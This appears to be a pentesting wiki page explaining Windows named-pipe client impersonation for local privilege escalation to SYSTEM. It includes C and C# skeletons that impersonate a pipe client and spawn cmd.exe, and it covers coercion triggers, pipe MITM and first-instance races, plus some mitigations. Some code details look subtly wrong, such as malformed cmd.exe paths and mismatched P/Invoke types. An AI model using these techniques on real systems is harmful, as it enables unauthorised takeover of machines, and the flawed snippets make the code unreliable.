# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation is a local privilege escalation primitive that lets a named-pipe server thread adopt the security context of a client that connects to it. In practice, an attacker who can run code with SeImpersonatePrivilege can coerce a privileged client (e.g., a SYSTEM service) to connect to an attacker-controlled pipe, call ImpersonateNamedPipeClient, duplicate the resulting token into a primary token, and spawn a process as the client (often NT AUTHORITY\SYSTEM).

This page focuses on the core technique. For end-to-end exploit chains that coerce SYSTEM to your pipe, see the Potato family pages referenced below.

## TL;DR
- Create a named pipe: \\.\pipe\<random> and wait for a connection.
- Make a privileged component connect to it (spooler/DCOM/EFSRPC/etc.).
- Read at least one message from the pipe, then call ImpersonateNamedPipeClient.
- Open the impersonation token from the current thread, DuplicateTokenEx(TokenPrimary), and CreateProcessWithTokenW/CreateProcessAsUser to get a SYSTEM process.

## Requirements and key APIs
- Privileges typically needed by the calling process/thread:
  - SeImpersonatePrivilege to successfully impersonate a connecting client and to use CreateProcessWithTokenW.
  - Alternatively, after impersonating SYSTEM, you can use CreateProcessAsUser, which may require SeAssignPrimaryTokenPrivilege and SeIncreaseQuotaPrivilege (these are satisfied when you’re impersonating SYSTEM).
- Core APIs used:
  - CreateNamedPipe / ConnectNamedPipe
  - ReadFile/WriteFile (must read at least one message before impersonation)
  - ImpersonateNamedPipeClient and RevertToSelf
  - OpenThreadToken, DuplicateTokenEx(TokenPrimary)
  - CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level: to perform useful actions locally, the client must allow SecurityImpersonation (default for many local RPC/named-pipe clients). Clients can lower this with SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION when opening the pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
    LPCSTR pipe = "\\\\.\\pipe\\evil";
    HANDLE hPipe = CreateNamedPipeA(
        pipe,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1, 0, 0, 0, NULL);

    if (hPipe == INVALID_HANDLE_VALUE) return 1;

    // Wait for privileged client to connect (see Triggers section)
    if (!ConnectNamedPipe(hPipe, NULL)) return 2;

    // Read at least one message before impersonation
    char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

    // Impersonate the last message sender
    if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

    // Extract and duplicate the impersonation token into a primary token
    HANDLE impTok = NULL, priTok = NULL;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
    if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

    // Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
    STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
    if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
                                 L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
                                 0, NULL, NULL, &si, &pi)) {
        // Fallback: CreateProcessAsUser after you already impersonated SYSTEM
        CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
                             NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    }

    RevertToSelf(); // Restore original context
    return 0;
}
```
Notes:
- If ImpersonateNamedPipeClient returns ERROR_CANNOT_IMPERSONATE (1368), ensure you read from the pipe first and that the client didn’t restrict impersonation to Identification level.
- Prefer DuplicateTokenEx with SecurityImpersonation and TokenPrimary to create a primary token suitable for process creation.

## .NET quick example
In .NET, NamedPipeServerStream can impersonate via RunAsClient. Once impersonating, duplicate the thread token and create a process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
  [DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
  [DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
  [DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
  static void Main(){
    using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
    s.WaitForConnection();
    // Ensure client sent something so the token is available
    s.RunAsClient(() => {
      IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
      IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
      var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
      Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
    });
  }
}
```

## Common triggers/coercions to get SYSTEM to your pipe
These techniques coerce privileged services to connect to your named pipe so you can impersonate them:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

When a privileged service and a low-privileged process communicate over `\\.\pipe\...`, treat the pipe like any other untrusted IPC boundary. Beyond classic server-side impersonation, weak pipe ACLs, unsafe creation flags, and client-side trust decisions can all become local privilege escalation primitives.

### Enumerate candidate pipes first
- List pipes quickly from PowerShell: `Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe` is useful to spot instance counts and single-instance pipes.
- Prioritize names used by services running as `SYSTEM`, especially helpers, updaters, launchers, and UI brokers.

### MITM via permissive DACLs and extra pipe instances
- Any process that can talk to a privileged server can already fuzz its protocol and hunt privileged verbs.
- The more interesting case is when the DACL grants `FILE_GENERIC_WRITE`/`GENERIC_WRITE` on the pipe object. On named pipes this implicitly includes `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` shares the same bit), so an attacker can create another server instance with the same name.
- Because instances are matched in FIFO order, attacker-created and legitimate instances can be interleaved: create a rogue instance with `CreateNamedPipe`, then open the same pipe name with `CreateFile`, and wait for a real client to land on the rogue server instance.
- Result: observe, modify, relay, or desynchronize privileged IPC without needing to own the original server process.

### First-instance race on pipe security descriptors
- `lpSecurityAttributes` only defines the DACL when the first instance of a pipe name is created.
- If a privileged service starts late and does not use `FILE_FLAG_FIRST_PIPE_INSTANCE`, an attacker can pre-create the pipe name with a permissive DACL, then let the service create later instances under the attacker-chosen security context.
- This turns service startup into a race condition: win the first instance, then connect or MITM later clients using the weakened ACL.
- Mitigation for defenders, and a key review point for attackers: check whether `CreateNamedPipe(..., dwOpenMode, ...)` includes `FILE_FLAG_FIRST_PIPE_INSTANCE`. If not, test pre-creation before the service starts.

### PID/signature checks are hardening, not a boundary
- Some products try to restrict access by checking `GetNamedPipeClientProcessId`, process image path, or Authenticode signer of the connecting client.
- This only helps until you inject into the legitimate client: once inside the trusted process, you inherit the exact PID/image/signature context the server expects.
- For split desktop apps, instrumenting the low-privileged UI/helper process is often easier than attacking the `SYSTEM` service directly.

### Hook the client according to its I/O model
- Synchronous I/O: intercept `NtWriteFile` before the syscall consumes the buffer, and inspect/patch `NtReadFile` after it returns.
- Overlapped I/O: store the `OVERLAPPED`/`IoStatusBlock` seen in `NtReadFile`, then inspect the buffer after `GetOverlappedResult` or the relevant wait completes.
- Completion ports: `GetQueuedCompletionStatus` reaches `NtRemoveIoCompletion`; the returned `ApcContext` links back to the `OVERLAPPED` used by the original read, which is the right pivot to find the now-populated buffer.
- Completion routines (`ReadFileEx`): the completion callback is delivered as an APC. If you want to tamper with returned data or inject synthetic replies, hook the real completion routine and, for custom injection, use a one-argument `QueueUserAPC` dispatcher that reconstructs the routine's 3 expected arguments.

### Tooling notes
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) proxies named-pipe traffic through an injected helper DLL and exposes a Burp-like workflow for editing/replay.
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) takes a Frida-based approach and focuses on hooking `NtReadFile`/`NtWriteFile` plus the async/completion pivots above, then forwarding traffic to a WebSocket-backed editing workflow.

```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```

### Operational considerations
- Named pipes are low-latency; long pauses while editing buffers can deadlock brittle services.
- Overlapped/completion-port/APC-driven clients need different hooks than simple `ReadFile`/`WriteFile` detours.
- Injection into the trusted client is noisy and generally best kept for exploit development, protocol reversing, or local lab fuzzing.

## Troubleshooting and gotchas
- You must read at least one message from the pipe before calling ImpersonateNamedPipeClient; otherwise you’ll get ERROR_CANNOT_IMPERSONATE (1368).
- If the client connects with SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, the server cannot fully impersonate; check the token’s impersonation level via GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW requires SeImpersonatePrivilege on the caller. If that fails with ERROR_PRIVILEGE_NOT_HELD (1314), use CreateProcessAsUser after you already impersonated SYSTEM.
- Ensure your pipe’s security descriptor allows the target service to connect if you harden it; by default, pipes under \\.\pipe are accessible according to the server’s DACL.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
